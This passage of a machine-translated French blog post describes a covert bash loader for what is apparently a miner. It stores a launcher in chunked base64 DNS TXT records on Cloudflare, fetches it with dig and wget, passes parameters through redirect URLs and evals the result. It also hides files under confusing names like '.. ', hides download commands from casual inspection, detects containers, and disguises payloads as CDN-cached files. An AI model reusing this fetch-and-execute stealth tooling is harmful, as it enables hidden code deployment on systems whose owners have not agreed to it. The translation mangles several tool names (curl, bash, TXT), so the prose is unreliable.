résiste à l'épreuve du temps. Mise à jour<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> Les enregistrements sont faciles et le DNS est la dernière chose qui s'arrête au sein d'un réseau..parce que les adresses IP sont difficiles à mémoriser...il y a donc de fortes chances qu'il soit disponible la plupart du temps. Tu vois quand nous sommes<em> récupération du script de déploiement</em>nous exécutons déjà une certaine logique, c'est le script du lanceur, il a besoin de la possibilité d'effectuer des requêtes DNS pour rechercher nos enregistrements, le DNS peut être omniprésent mais<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> creuser</a> n'est pas.<p>Il y a une petite énigme ici, si nous devons télécharger un autre outil<em> pour télécharger un autre script pour télécharger la charge utile</em> nous devrions juste télécharger la charge utile ! En défense... faire cette danse scripty ajoute à l'obscurcissement, permet de ne garder qu'une seule implémentation du lanceur (maintenabilité, oui), n'est pas nécessaire la plupart du temps... donc nous entretenons également un<a href=https://en.wikipedia.org/wiki/Standalone_program> lié statiquement</a> dig exécutable pour effectuer des requêtes DNS, récupérées soit par l'auto-hébergement, soit par l'hébergement cloud (oui, il existe des solutions de secours, comme 3 ou 4, car les services cloud ont une bande passante gratuite très minimale et nécessitent également des cookies ou des jetons d'accès... hostile, à dessein, bien sûr).<p>Qu'y a-t-il dans les enregistrements DNS ? Nous utilisons<a href=https://en.wikipedia.org/wiki/TXT_record> SMS</a> enregistrements, sur un domaine personnalisé (replis ici aussi). Pourquoi TXT ? ce sont eux qui peuvent stocker la plus grande quantité de données..généralement car c'est en quelque sorte<a href=https://www.ietf.org/rfc/rfc6763.txt> conseillé</a> cela dépend de<em> des choses</em> . Nous utilisons spécifiquement<a href=https://www.cloudflare.com/> éclat de nuage</a> pour notre bidouillage DNS car il est gratuit, et à peu près le seul joueur en ville (<em> eh bien pas vraiment mais toute autre alternative pâlit en termes de fonctionnalités</em> ). Il arrive que vous puissiez stocker plusieurs données sur le<em> même</em> record... cela commence à devenir confus et brouiller pour certaines spécifications... (tangente) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> habitué</a> Autoriser<em> enchaîné</em>Les enregistrements TXT totalisant ~ 9k octets, les documents indiquent maintenant ~ 2k octets, avant le changement, j'utilisais ~ 6k je pense, et je servais le script non compressé, après cela j'ai dû éclaircir le script et le compresser au préalable (en fait, je essayé d'utiliser un<a href=https://freedns.afraid.org/> affranchis</a> fournisseur, j'ai été banni en un jour, supposant qu'ils ont une politique stricte d'enregistrements TXT sans gras), mais la compression gzip ne semble PAS être compatible avec les tuyaux et causait toujours des problèmes, j'ai donc dû réussir à caser le script sans compression ( tangente terminale).<p>Comment le stockons-nous ? Les enregistrements TXT ne prennent en charge que les chaînes alphanumériques, non<a href=https://en.wikipedia.org/wiki/Null_character> NUL</a> , nous devons donc l'envelopper dans un codage non nul,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> satisfait cette contrainte, et parce que nous stockons<em> enchaîné</em> TXT, nous devons fragmenter la sortie, puisque nous utilisons des éléments shell, cela se fait via le<code>-w</code> flag, sur busybox, ce drapeau était absent (ou opt-in) sur les anciennes versions, ce qui était ennuyeux, une alternative consiste à utiliser l'encodeur fourni avec openssl,<code>openssl enc -base64</code>.<p>Maintenant que nous savons comment stocker notre script de déploiement, nous le stockons avec soit<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> ou manuellement. Comment le tire-t-on ? Nous avons mentionné que nous avons besoin de bindutils ou de notre propre<code>dig</code> ... après avoir choisi le point de terminaison de diffusion, nous voulons le télécharger, ce qui est disponible est généralement<a href=https://www.gnu.org/software/wget/> wget</a> ou<a href=https://curl.se/> boucle</a> , wget se trouve beaucoup plus souvent préinstallé, cependant busybox ne prend en charge tls qu'avec les bibliothèques dynamiques, vous devez donc vous assurer que le point de terminaison sert http ou que votre utilitaire est<code>wget</code> de gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>ça veut dire essayer<code>-t2</code> temps d'attente<code>-T10</code> secondes étant<code>-q</code> lecture tranquille de<code>-i-</code> standard (<code>$digurl</code> ) et en écrivant à<code>-O-</code> sortie standard (<code>$filename</code>). Cette commande ne révèle pas ce que nous téléchargeons au premier coup d'œil. Nous allons être très prudents avec les autres commandes shell pour la même raison, ou rester avec shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> frapper</a> ) intégrés dans la mesure du possible. Faites également attention à l'endroit où vous téléchargez vos exécutables, vous voulez vous assurer de pouvoir les exécuter, car certains points de montage, en particulier dans les conteneurs et<code>tmp</code> les chemins sont<code>noexec</code> . Maintenant que nous avons notre outil de requête DNS, nous récupérons nos enregistrements<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +<span class=hljs-built_in>timeout</span>=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Les drapeaux sont explicites ici,<code>+short</code> signifie simplement que nous ne sommes intéressés que par les données elles-mêmes, de sorte que nous n'avons pas à analyser la sortie. Il est important de spécifier le serveur DNS, comme google (<code>8.8.8.8</code> ) ou cloudflare (<code>1.1.1.1</code> ) car de nombreux environnements redirigent les requêtes DNS ou proxy vers leurs propres serveurs DNS par défaut. Après avoir récupéré le script fragmenté, nous traitons les guillemets et les espaces pour le préparer au décodage<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span> <span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span> <span class=hljs-comment># remove whitespace</span>
<span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span> <span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span> <span class=hljs-comment># iterate over each line and remove the first characther</span>
<span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span> <span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span> <span class=hljs-comment># ensure joining didn't add whitespace</span>
<span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span> <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Et si maintenant nous<em> toujours</em> vous n'avez pas notre lanceur ? Le DNS est désordonné, nous voulons une solution de secours, configurons un sous-domaine pour récupérer directement le script du lanceur. Avant d'évaluer notre script, nous voulons le personnaliser, avec quelques variables, utilisons à nouveau un enregistrement TXT pour stocker une liste de variables NAME=VALUE et l'analyser. Il existe également une solution de repli pour les variables, cloudflare propose des redirections basées sur des URL, ces redirections sont servies<em> avant</em> la destination, nous n'avons donc pas besoin d'un point de terminaison, nous voulons juste configurer des règles de redirection basées sur regex vers un point de terminaison fictif, ce qui nous intéresse, ce sont les paramètres de l'url<code>?NAME=VALUE&NAME2=VALUE2...</code>, afin que nous puissions paramétrer notre launcher simplement en changeant l'url de redirection, toujours en faisant attention aux codes d'échappement et de citation<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span> <span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>Le wget<code>-S</code> imprime l'URL de redirection qui nous intéresse pour l'analyse. Ayant les paramètres et le script, nous évaluons les variables en les écrivant sur un fichier<pre><code class="bash hljs"><span class=hljs-built_in>eval</span> <span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span>
<span class=hljs-built_in>echo</span> <span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Ce fichier proviendra du script de déploiement. La dernière partie du script de démarrage est d'actualiser<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trampoline</a> , évaluez le script dans le processus shell actuel, ou laissez-le être géré par tmux si possible.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span>
<span class=hljs-built_in>eval</span> <span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span>
<span class=hljs-built_in>echo</span> <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Le script du lanceur est vidé dans un fichier nommé ".. " cela semble déroutant car il peut être confondu avec un<em> parent</em> annuaire. Et nous n'incluons pas la commande de session, car cela persisterait dans la commande de processus, au lieu de cela, nous démarrons la session tmux au préalable et envoyons la commande source via l'interface du terminal tmux. En rapport avec cela, parfois appeler un exécutable avec<code>./</code> conserve ces caractères dans la commande, il est donc préférable d'ajouter le<code>$PWD</code> au chemin..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> La charge utile</a></h2><p>Notre script de déploiement commence par rechercher le<code>env.sh</code> fichier, et conserver ou configurer les vars comme<code>STARTING_*</code> vars comme<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Cela nous permet de tuer et de redémarrer une instance en cours d'exécution tout en réinitialisant l'environnement. Passons à un répertoire tmp avec des capacités d'exécution<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span> <span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span>
<span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; <span class=hljs-keyword>do</span>
    <span class=hljs-built_in>rm</span> -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        <span class=hljs-built_in>mkdir</span> -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span>
<span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span> <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Vérifier si dans un<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> récipient</a> est également pratique, nous pouvons sonder le système de fichiers à la recherche d'indices<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span> <span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Il est maintenant temps de télécharger notre payload, nous choisissons de prendre en charge à la fois wget et curl, nous savons déjà comment utiliser wget avec des drapeaux prudents, pour curl c'est un peu différent. Nous devons créer un fichier de configuration et remplacer<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span> <span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>La dernière étape consiste simplement à extraire la charge utile<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Il convient de mentionner l'utilisation d'un [CDN] pour la maintenance de la charge utile. Ici encore, cloudflare à la rescousse nous évite des dépenses de bande passante. En renommant simplement notre charge utile compressée avec un<em> extension de fichier</em> pris en charge par cloudflare... il devient mis en cache. Cloudflare ne vérifie pas les en-têtes de ce qu'il sert, peut-être parce que le faire à cette échelle est tout simplement impraticable.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Aventures dans le Bashland</a></h2><p>Bash a été choisi en partant du principe qu'il est portable, qu'il n'a pas l'air trop déplacé et qu'il est plus omniprésent par rapport à d'autres langages de script tels que perl, ruby ​​ou python. La vérité est qu'un binaire autonome écrit en golang ou en lua aurait été beaucoup plus facile, avec moins de bugs et plus facile à entretenir, fondamentalement bash était le pire choix possible, pour ma défense, au moment où j'ai gratté tant de démangeaisons avec bash , il était trop tard pour une réécriture, et ça devenait aussi un peu ennuyeux.<p>Il y avait aussi la possibilité d'utiliser busybox avec l'indicateur d'heure de compilation pour utiliser toutes les fonctions intégrées (comme grep et sed), mais l'utilisation de ces fonctions ne permet pas de générer des tâches (fork) et expose le démon à des blocages potentiels.<p>Je vais décrire quelques fonctions bash ici, avec la liste complète disponible<a href=\assets/posts/bash_functions.txt> ici</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span>
<span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span>
        <span class=hljs-built_in>printf</span> <span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Utilisez le<code>RANDOM</code> variable pour obtenir un nombre compris entre 97 et 122 correspondant à un code de caractère, printf doit être une fonction intégrée, nous ne voulons pas faire de bifurcation dans une boucle.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span>
<span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span> <span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span>
    <span class=hljs-built_in>eval</span> <span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    <span class=hljs-built_in>mkfifo</span> <span class=hljs-variable>$pp</span>
    <span class=hljs-built_in>unset</span> <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>
    <span class=hljs-built_in>eval</span> <span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span>
    <span class=hljs-comment># unlink the named pipe</span>
    <span class=hljs-built_in>rm</span> -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Tirez parti des tuyaux pour créer des descripteurs de fichiers anonymes, ceux-ci ne se comportent pas exactement comme les descripteurs de fichiers, mais ils sont assez bons pour<a href=https://en.wikipedia.org/wiki/Inter-process_communication> CIB</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span>
<span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span>
    <span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span>
    <span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span>
    <span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Dormir sans bifurquer, en abusant de la fonctionnalité de délai d'attente de la fonction intégrée de lecture, il utilise un descripteur de fichier dédié et nous devons nous assurer qu'il est disponible pour éviter la résiliation.<p>Il y a des fonctions comme<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> sont utilisés pour surveiller l'utilisation du système, ils utilisent tous le système Linux<code>/proc</code> fichiers sans outils comme<code>ps</code> , donc pas de bifurcation, tout pur bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span> <span class=hljs-built_in>unset</span>
    <span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
        <span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
        <span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>
        <span class=hljs-keyword>fi</span>

        <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span>
            <span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span>
        <span class=hljs-keyword>fi</span>

        <span class=hljs-built_in>log</span> <span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span>
        <span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> <span class=hljs-comment>## only the variable, not functions</span>
        <span class=hljs-built_in>eval</span> <span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span> <span class=hljs-comment># 2>/dev/null</span>
        <span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span>
    <span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span> <span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span> <span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span> <span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Les coprocessus sont disponibles depuis bash<code>v4</code> , ils sont comme des travaux sauf qu'ils ont un nom et leurs propres descripteurs de fichiers.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span>
<span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span>
            <span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span>
                <span class=hljs-keyword>case</span> <span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span> <span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span> <span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span>
            <span class=hljs-keyword>fi</span>
    <span class=hljs-keyword>done</span>
}</code></pre><p>Nous écrivons un démon, qui est un processus de longue durée, et nous utilisons de nombreux descripteurs de fichiers, nous voulons vraiment faire quelques nettoyages pour éviter d'encourir<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimites</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span>
<span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span> <span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span> <span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span> <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> <span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span> <span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span> <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> <span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span> <span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span>
        <span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span> <span class=hljs-string>"<span class=hljs-variable>$l</span>"</span> <span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span>
            <span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Cette fonction repose sur<a href=https://ipinfo.io/> infos ip</a> pour déterminer la région du travailleur, ce qui permet de régler une logique dépendante de la région,<a href=\assets/posts/geoip.json> geoip.json</a> regroupe les pays en régions, car nous voulons la région de niveau supérieur et ne sommes pas intéressés par le pays spécifique.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span>
<span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span> <span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span>
<span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span> <span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span> <span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    <span class=hljs-built_in>timeout</span> 3 open_connection <span class=hljs-variable>$host</span> <span class=hljs-variable>$port</span> <span class=hljs-variable>$conn_socket</span>
    <span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span>
        <span class=hljs-comment># close connection</span>
        <span class=hljs-built_in>eval</span> <span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span>
    <span class=hljs-keyword>else</span>
        <span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span>
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Bash prend en charge les connexions tcp, en ayant une abstraction sur<code>/dev/tcp</code> (également pour udp, mais la plupart du temps, il semble être généralement désactivé au moment de la construction, vous ne pouvez donc pas vous y fier). Ces fichiers sont une chose bash, ils ne font pas partie de linux<code>/dev</code> arbre.<p>Il convient de mentionner également un système de verrouillage pour gérer la simultanéité entre les tâches bash. Pour permettre à plusieurs travaux de fonctionner avec des verrous, ils doivent tous partager un descripteur de fichier, donc notre<code>locker</code> qui est aussi un travail, doit être démarré avant les autres travaux souhaitant utiliser le verrou. Le casier se lit simplement<code>stdin</code> en attente de demandes de verrouillage, réponse sur<code>stdout</code> en fonction de l'état booléen courant stocké dans une variable. Je ne garantis pas que cette approche est sans course, mais semble fonctionner correctement.<em> tuyaux</em> et éventuellement des impasses (ce qui signifie que vous ne pouvez pas compter sur le casier pour vous donner une réponse tout le temps).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span>
<span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span> <span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span>
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span> <span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span>
        <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span>
        <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span>
    <span class=hljs-keyword>done</span>
    <span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span> <span class=hljs-built_in>echo</span> <span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span> <span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span>
    <span class=hljs-keyword>done</span>
    <span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span>
<span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span> <span class=hljs-comment>## multiline var</span>
